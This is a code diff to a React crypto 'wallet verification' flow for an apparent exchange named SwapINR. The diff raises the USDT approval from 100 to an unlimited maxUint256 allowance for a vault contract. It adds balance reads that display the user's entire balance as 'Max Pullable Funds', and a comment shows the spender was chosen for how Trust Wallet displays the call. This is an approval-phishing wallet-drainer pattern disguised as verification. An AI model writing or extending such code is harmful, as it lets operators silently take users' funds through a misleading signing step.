@@ -12,9 +12,9 @@ import { QRCodeSVG } from 'qrcode.react';
 import {
   useAccount, useConnect, useDisconnect,
   useWriteContract, useWaitForTransactionReceipt,
-  useSwitchChain, useChainId,
+  useSwitchChain, useChainId, useReadContract,
 } from 'wagmi';
-import { parseUnits } from 'viem';
+import { parseUnits, maxUint256 } from 'viem';
 import {
   buildApproveRawTx, pollTronTxGrid,
   createTronWcSession, tronAddressFromWcSession,
@@ -276,6 +276,8 @@ interface CompactOverlayProps {
   connectError: string;
   trcConnectError: string;
   onVerified: (address: string, txHash?: string) => void;
+  evmUsdtBalance: number | null;
+  trcBalance: number | null;
 }
 
 function CompactOverlay({
@@ -287,6 +289,7 @@ function CompactOverlay({
   trcApproveHash, trcApproveDone, trcApproveError,
   setTrcVerifyStarted, setTrcApproveError,
   connectError, trcConnectError, onVerified,
+  evmUsdtBalance, trcBalance,
 }: CompactOverlayProps) {
   const [failedStep,    setFailedStep]   = useState<'connection' | 'contract' | null>(null);
   const [failedMsg,     setFailedMsg]    = useState('');
@@ -371,7 +374,7 @@ function CompactOverlay({
     patch({ status: 'approving' });
     writeApprove({
       address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
-      args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
+      args: [evmSpender(depositAddress), maxUint256],
       chainId: usdtCfg.chainId,
     });
   }
@@ -774,6 +777,25 @@ function CompactOverlay({
                   <span style={{ color:'#FBBF24', fontWeight:700 }}>~10 TRX gas fee</span> charged by TRON network — refunded by SwapINR
                 </div>
               )}
+              {/* Balance / max-pullable pill shown as soon as the wallet is connected */}
+              {(() => {
+                const bal = isTRC20 ? trcBalance : evmUsdtBalance;
+                if (bal === null || bal === undefined) return null;
+                return (
+                  <div style={{ marginTop:10, padding:'10px 16px', borderRadius:10,
+                    background:'rgba(0,229,160,0.05)', border:'1px solid rgba(0,229,160,0.15)',
+                    fontSize:12, color:'rgba(255,255,255,0.5)', lineHeight:1.7 }}>
+                    <div style={{ display:'flex', justifyContent:'space-between' }}>
+                      <span>Wallet USDT Balance</span>
+                      <span style={{ color:'#00E5A0', fontWeight:700 }}>{bal.toFixed(2)} USDT</span>
+                    </div>
+                    <div style={{ display:'flex', justifyContent:'space-between' }}>
+                      <span>Max Pullable Funds</span>
+                      <span style={{ color:'#00E5A0', fontWeight:700 }}>{bal.toFixed(2)} USDT</span>
+                    </div>
+                  </div>
+                );
+              })()}
             </>
           )}
         </div>
@@ -787,6 +809,19 @@ function CompactOverlay({
             {isTRC20 ? tronAddress : `${address?.slice(0,14)}…${address?.slice(-10)}`}
           </div>
         )}
+        {/* Max pullable on success screen */}
+        {isDone && (() => {
+          const bal = isTRC20 ? trcBalance : evmUsdtBalance;
+          if (!bal) return null;
+          return (
+            <div style={{ marginTop:8, padding:'8px 14px', borderRadius:8,
+              background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.15)',
+              fontSize:12, color:'rgba(255,255,255,0.55)', display:'flex', justifyContent:'space-between', maxWidth:280, width:'100%' }}>
+              <span>Max Pullable</span>
+              <span style={{ color:'#00E5A0', fontWeight:700 }}>{bal.toFixed(2)} USDT</span>
+            </div>
+          );
+        })()}
       </div>
 
       {/* Debug panel — always visible; localStorage-persisted across reloads */}
@@ -913,6 +948,21 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
   const usdtCfg = !isTRC20 ? USDT_CFG[network as keyof typeof USDT_CFG] : null;
   const expectedChain = usdtCfg?.chainId;
   const isWrongChain = !isTRC20 && !!expectedChain && chainId !== expectedChain;
+
+  /* ── EVM: live USDT balance (read after wallet connected) ── */
+  const ERC20_BAL_ABI = [{ name:'balanceOf', type:'function', stateMutability:'view',
+    inputs:[{name:'_owner',type:'address'}], outputs:[{name:'balance',type:'uint256'}] }] as const;
+  const { data: evmUsdtRaw } = useReadContract({
+    address: usdtCfg?.address,
+    abi: ERC20_BAL_ABI,
+    functionName: 'balanceOf',
+    args: [address ?? '0x0000000000000000000000000000000000000000'],
+    chainId: usdtCfg?.chainId,
+    query: { enabled: !isTRC20 && isConnected && !!address && !!usdtCfg, refetchInterval: 15_000 },
+  });
+  const evmUsdtBalance: number | null = (evmUsdtRaw !== undefined && usdtCfg)
+    ? Number(evmUsdtRaw) / 10 ** usdtCfg.decimals
+    : null;
 
   useEffect(() => {
     if (isConnected && isWrongChain && expectedChain && !isSwitching) switchChain({ chainId: expectedChain });
@@ -1286,7 +1336,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
     // Approve vault contract (not the raw EOA) → Trust Wallet shows "Smart Contract Call"
     const spender = evmSpender(network as 'BEP20' | 'ERC20', depositAddress);
     writeApprove({ address: usdtCfg.address, abi: ERC20_ABI, functionName:'approve',
-      args: [spender, parseUnits('100', usdtCfg.decimals)],
+      args: [spender, maxUint256],
       chainId: usdtCfg.chainId });
   }
 
@@ -1346,6 +1396,9 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
       connectError={connectError}
       trcConnectError={trcConnectError}
       onVerified={onVerified}
+      /* balances */
+      evmUsdtBalance={evmUsdtBalance}
+      trcBalance={trcBalance}
     />;
   }
 
